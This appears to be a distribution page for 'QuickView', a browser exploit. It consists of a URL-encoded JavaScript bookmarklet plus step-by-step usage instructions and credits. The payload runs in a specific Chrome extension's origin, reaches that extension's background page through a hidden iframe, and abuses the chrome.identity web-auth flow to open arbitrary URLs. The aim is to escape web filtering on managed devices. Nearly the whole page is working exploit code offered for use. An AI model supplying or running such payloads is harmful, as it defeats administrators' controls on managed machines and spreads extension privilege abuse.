---
title: webview-quickview
---

-e 
QuickView:
This exploit creates login windows with arbitrary URLs, allowing you to browse the web without any extensions.
A blog post with an explanation is available on this link - https://ading.dev/blog/posts/quickview.html.

Javascript:
javascript:!function()%7Bif(%22chrome-extension%3A%2F%2Fbpmcpldpdmajfigpchkicefoigmkfalc%22!%3D%3Dwindow.origin)return void alert(%22This is the wrong page to execute QuickView.%22)%3Bif(window.quickview)return void alert(%22QuickView is already active in this tab.%22)%3Bwindow.quickview%3D!0%3Blet t%3Dt%3D%3Edocument.getElementById(t)%2Cn%3D%7BGoogle%3A%22https%3A%2F%2Fgoogle.com%22%2CYoutube%3A%22https%3A%2F%2Fyoutube.com%22%2CDiscord%3A%22https%3A%2F%2Fdiscord.com%22%2CReddit%3A%22https%3A%2F%2Freddit.com%22%2C%22Titanium Network%22%3A%22https%3A%2F%2Ftitaniumnetwork.org%22%7D%2Ce%3Dnull%3Bfunction i()%7Blet n%3Dt(%22url_input%22).value%3Bn.startsWith(%22https%3A%2F%2F%22)%7C%7Cn.startsWith(%22http%3A%2F%2F%22)%7C%7Calert(%22Warning%3A Your URL does not begin with http%3A%2F%2F or https%3A%2F%2F.%22)%2Co(n)%7Dfunction o(t)%7Blet n%3D%60data%3Atext%2Fhtml%2C%5Cn    %3Chtml%3E%5Cn      %3Chead%3E%5Cn        %3Cscript%3E%5Cn          setTimeout(() %3D%3E %7B%5Cn            window.location.href %3D %22%24%7BencodeURIComponent(t)%7D%22%3B%5Cn          %7D%2C 500)%3B%5Cn        %3C%5C%2Fscript%3E%5Cn      %3C%2Fhead%3E%5Cn      %3Cbody%3E%5Cn        %3Cp%3ERedirecting to %24%7Bt%7D%3C%2Fp%3E%5Cn      %3C%2Fbody%3E%5Cn    %3C%2Fhtml%3E%60%3Be.chrome.identity.launchWebAuthFlow(%7Burl%3An%2Cinteractive%3A!0%7D%2C(()%3D%3E%7B%7D))%7D!function(t)%7Blet n%3Ddocument.createElement(%22iframe%22)%3Bn.style.display%3D%22none%22%2Cn.src%3Dwindow.origin%2B%22%2Fscripts%2Fcommon%2Felements%2Fhyperlink%2Fhyperlink.html%22%2Cn.onload%3D()%3D%3E%7Bt(n.contentWindow.chrome.extension.getBackgroundPage())%2Cn.remove()%7D%2Cdocument.body.append(n)%7D((function(a)%7Be%3Da%2Cdocument.write('%5Cn  %3C!DOCTYPE html%3E%5Cn  %3Chtml%3E%5Cn    %3Chead%3E%5Cn      %3Cmeta charset%3D%22utf-8%22%3E%5Cn      %3Cmeta name%3D%22viewport%22 content%3D%22width%3Ddevice-width%22%3E%5Cn      %3Clink rel%3D%22stylesheet%22 href%3D%22https%3A%2F%2Ffonts.xz.style%2Fserve%2Finter.css%22%3E%5Cn      %3Clink rel%3D%22icon%22 href%3D%22https%3A%2F%2Fquickview-exploit.pages.dev%2Fimg%2Ficon_32.png%22%3E%5Cn      %3Ctitle%3EQuickView GUI%3C%2Ftitle%3E%5Cn      %3Cstyle%3E%5Cn        %5Cn  * %7B%5Cn    font-family%3A %22Inter%22%2C sans-serif%3B%5Cn    color%3A %23e2e8f0%5Cn  %7D%5Cn%5Cn  body %7B%5Cn    background-color%3A %230f172a%3B%5Cn  %7D%5Cn%5Cn  .button %7B%5Cn    background-color%3A %231a73e8%3B%5Cn    text-decoration%3A none%3B%5Cn    user-select%3A none%3B%5Cn    font-size%3A 14px%3B%5Cn    padding%3A 10px%3B%5Cn  %7D%5Cn%5Cn  %23title_div %7B%5Cn    display%3A flex%3B%5Cn    align-items%3A center%3B%5Cn    gap%3A 16px%3B%5Cn  %7D  %5Cn%5Cn  %23input_div %7B%5Cn    display%3A flex%3B%5Cn    gap%3A 6px%5Cn  %7D%5Cn%5Cn  %23url_input %7B%5Cn    padding%3A 9px%3B%5Cn    background-color%3A %231e293b%3B%5Cn    border%3A 2px solid %23334155%3B%5Cn    width%3A 100%25%3B%5Cn  %7D%5Cn%5Cn  %23webview_button %7B%5Cn    width%3A 150px%3B%5Cn    text-align%3A center%3B%5Cn  %7D%5Cn%5Cn  %23content %7B%5Cn    max-width%3A 600px%3B%5Cn    margin-left%3A auto%3B%5Cn    margin-right%3A auto%3B%5Cn  %7D%5Cn      %3C%2Fstyle%3E%5Cn    %3C%2Fhead%3E %5Cn    %3Cbody%3E%5Cn      %3Cdiv id%3D%22content%22%3E%5Cn        %3Cdiv id%3D%22title_div%22%3E%5Cn          %3Cimg id%3D%22icon_img%22 src%3D%22https%3A%2F%2Fquickview-exploit.pages.dev%2Fimg%2Ficon.png%22 height%3D%2264px%22%3E%5Cn          %3Ch1%3EQuickView%3C%2Fh1%3E%5Cn        %3C%2Fdiv%3E%5Cn        %3Cdiv id%3D%22input_div%22%3E%5Cn          %3Cinput id%3D%22url_input%22 placeholder%3D%22Enter a URL here.%22%3E%5Cn          %3Ca id%3D%22webview_button%22 class%3D%22button%22 href%3D%22%23%22%3EOpen Webview%3C%2Fa%3E%5Cn        %3C%2Fdiv%3E%5Cn        %3Cp%3EEnter any URL into the box above and it will open in an unblocked webview. Note that if the page load fails%2C the webview will close without displaying anything.%3C%2Fp%3E%5Cn        %3Ch2%3EPreset URLs%3A%3C%2Fh2%3E%5Cn        %3Cul id%3D%22urls_list%22%3E%3C%2Ful%3E%5Cn%5Cn        %3Ch2%3ECredits%3A%3C%2Fh2%3E%5Cn        %3Cp%3EQuickView was created by vk6%237391 and Bypassi%237037%2C and it is licensed under the %3Ca href%3D%22https%3A%2F%2Fwww.gnu.org%2Flicenses%2Fgpl-3.0.txt%22 target%3D%22_blank%22%3EGNU GPL v3%3C%2Fa%3E. The source code is available at%3A %3Ca href%3D%22https%3A%2F%2Fgithub.com%2Fading2210%2Fquickview%22 target%3D%22_blank%22%3Ehttps%3A%2F%2Fgithub.com%2Fading2210%2Fquickview%3C%2Fa%3E%3C%2Fp%3E%5Cn        %3Cp%3EThis exploit is part of the %3Ca href%3D%22https%3A%2F%2Fgithub.com%2Fswarm-team%22 target%3D%22_blank%22%3E%7Bswarm%7D project%3C%2Fa%3E and utilizes a variation of the %3Ca href%3D%22https%3A%2F%2Fblog.bypassi.com%2F_%2Fpoint-blank%22 target%3D%22_blank%22%3Epoint-blank%3C%2Fa%3E exploit.%3C%2Fp%3E%5Cn      %3C%2Fdiv%3E%5Cn    %3C%2Fbody%3E%5Cn  %3C%2Fhtml%3E')%2Cfunction()%7Blet e%3Dt(%22urls_list%22)%2Ci%3Dt(%22url_input%22)%3Bfor(let%5Bt%2Co%5Dof Object.entries(n))%7Blet n%3Ddocument.createElement(%22li%22)%2Ca%3Ddocument.createElement(%22a%22)%3Ba.innerHTML%3Dt%2Ca.onclick%3Dfunction()%7Bi.value%3Do%7D%2Ca.href%3D%22%23%22%2Cn.append(a)%2Ce.append(n)%7D%7D()%2Ce.tab_listener%26%26e.chrome.tabs.onUpdated.removeListener(e.tab_listener)%2Ce.tab_listener%3D(t%2Cn%2Ci)%3D%3E%7Bif(%22loading%22!%3D%3Dn.status)return%3Bif(%22https%3A%2F%2Fwww.google.com%2F%23%2520%22!%3Di.url)return%3Be.chrome.tabs.remove(t)%2Ce.popup%3De.open()%3Blet a%3De.popup.prompt(%22What URL would you like to open a webview for%3F%22%2C%22https%3A%2F%2Fwww.google.com%22)%3Ba%26%26o(a)%7D%2Ce.chrome.tabs.onUpdated.addListener(e.tab_listener)%2Ct(%22webview_button%22).onclick%3Di%7D))%7D()%3B;

Instructions:
-> Make a bookmarklet with the URL being the javascript above.
-> Double click on the opener button at the bottom of the page. This should open a new tab with a URL of about:blank#blocked.
-> On the newly opened tab, click on the bookmarklet that was just created.
-> The QuickView GUI should open, and you can now enter any URL to open it in an unblocked webview.
-> You can open another webview at any time by visiting https://www.google.com/# , and this will persist until a reboot. 
You can also drag the "QuickView Shortcut" button from below into your bookmarks bar for easy access. However, if you want to use the full GUI, you will have to use the website.

This exploit is part of the {swarm} project and utilizes a variation of the Point-Blank exploit.

Credits:
Bypassi#7037
ading2210 (vk6#7391)
https://github.com/ading2210/quickview
https://quickview-exploit.pages.dev/